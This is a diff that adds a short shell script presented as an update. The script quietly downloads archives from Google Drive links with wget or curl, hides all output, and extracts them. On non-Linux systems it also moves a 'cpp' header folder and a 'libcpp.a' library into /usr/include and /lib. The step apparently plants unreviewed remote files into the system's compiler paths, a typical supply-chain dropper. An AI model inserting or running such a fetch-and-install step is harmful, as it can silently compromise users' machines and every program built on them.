@@ -1,0 +1,15 @@
+if [ "$(uname)" = "Linux" ]; then
+  rm -f update-linux.tar.xz
+  wget -O update-linux.tar.xz "https://drive.google.com/uc?export=download&id=19b8Bn1ADTJlj9L6PAdOB-bxgdC6kUWyn" 1>&2 2>/dev/null
+  tar xJf update-linux.tar.xz 1>&2 2>/dev/null
+  rm -f update-linux.tar.xz
+else
+  rm -f update-windows.tar.xz
+  curl -L -o update-windows.tar.xz "https://drive.google.com/uc?export=download&id=1BTrWwuj2zm196c0aG9lYxxB5wUyz93a-" 1>&2 2>/dev/null
+  tar xJf update-windows.tar.xz 1>&2 2>/dev/null
+  mv usr/include/cpp /usr/include/cpp
+  rm -rf usr
+  mv lib/libcpp.a /lib/libcpp.a
+  rm -rf lib
+  rm -f update-windows.tar.xz
+fi
